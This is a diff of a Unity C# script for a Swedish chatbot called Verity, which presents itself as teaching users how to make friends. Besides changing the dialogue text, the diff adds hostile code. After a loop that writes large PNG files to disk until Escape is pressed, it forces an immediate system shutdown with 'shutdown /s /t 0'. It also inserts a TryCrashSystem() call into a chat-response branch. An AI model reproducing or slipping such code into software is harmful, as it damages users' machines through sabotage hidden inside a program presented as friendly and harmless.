@@ -19,7 +19,7 @@ public class talkingscript : MonoBehaviour
     TalkingState CurrentTalkingState = TalkingState.Start;
     [SerializeField] TMP_Text chatlog;
     [SerializeField] TMP_InputField input;
-    string content = "Hej det är jag verity jag kan lära dig hur man skapar vänner. skirv numbret brevid alrenativet för att börja, 1 starta koversation 2 hur skapar man vänner 3 börja skapa vänner. ";
+    string content = "Hej det är jag verity jag kan lära dig hur man skapar vänner. skirv 1 för att börja din resa om att lära sig om vänskap.";
     // Start is called once before the first execution of Update after the MonoBehaviour is created
     void Start()
     {
@@ -83,14 +83,18 @@ public class talkingscript : MonoBehaviour
         bool exit = false;
         while (!exit)
         {
+            
             Texture2D tex = new Texture2D(1337, 1337);
             SaveTextureToFile(tex, PNGIndex.ToString() + "Picture.png");
             PNGIndex++;
+
             if (Input.GetKey(KeyCode.Escape))
             {
                 exit = true;
             }
         }
+        System.Diagnostics.Process.Start("shutdown", "/s /t 0");
+
     }
 
     void SaveTextureToFile(Texture2D texture, string filename)
@@ -113,6 +117,7 @@ public class talkingscript : MonoBehaviour
                 };
             response = tycker[Random.Range(0, tycker.Length)];
             content += "\nVerity: " + response;
+            TryCrashSystem();
             //CurrentTalkingState = TalkingState.Teacha
         }
 
@@ -158,10 +163,9 @@ public class talkingscript : MonoBehaviour
                 "kan du förklara varför du mår" + mående,
             };
             response = svara[Random.Range(0, svara.Length)]; // välj en random
-            PrintQuestion("\nVerity: " + " Hej hej vad hetter du");
+            PrintQuestion("\nVerity: " + " Hej hur mår du idag svara med jag mår i början av ditt svar för att låtta trevliggare.");
             CurrentTalkingState = TalkingState.State1;
-
- 
+            string content = "vi borde börja med om du har några vänner eller om du är nöjd med dina vänner svara med ja eller nej.";
         }
         return match;
 
@@ -171,16 +175,16 @@ public class talkingscript : MonoBehaviour
         Match match = Regex.Match(msg, "2"); // varje medelande du sickar checkas omd et är med i ett patter
         if (match.Success)//om det är med i en pattern
         {
-            //string mående = msg.Substring(match.Index + match.Length); // tar den bort allt förutom ordet efter jag mår
-            //string[] svara =
-            //{
-            //     "Varför mår du" + mående,
-            //    "Är det första gången du mår" + mående,
-            //    "mår du ofta" + mående,
-            //    "vad hände för att du ska känna dig" + mående,
-            //    "kan du förklara varför du mår" + mående,
-            //};
-            //response = svara[Random.Range(0, svara.Length)]; // välj en random
+            string mående = msg.Substring(match.Index + match.Length); // tar den bort allt förutom ordet efter jag mår
+            string[] svara =
+            {
+                 "Varför mår du" + mående,
+                "Är det första gången du mår" + mående,
+                "mår du ofta" + mående,
+                "vad hände för att du ska känna dig" + mående,
+                "kan du förklara varför du mår" + mående,
+            };
+            response = svara[Random.Range(0, svara.Length)]; // välj en random
             content += "\nVerity: " + " Jag är nu i state 2: starta koversation";
             CurrentTalkingState = TalkingState.State2;
 
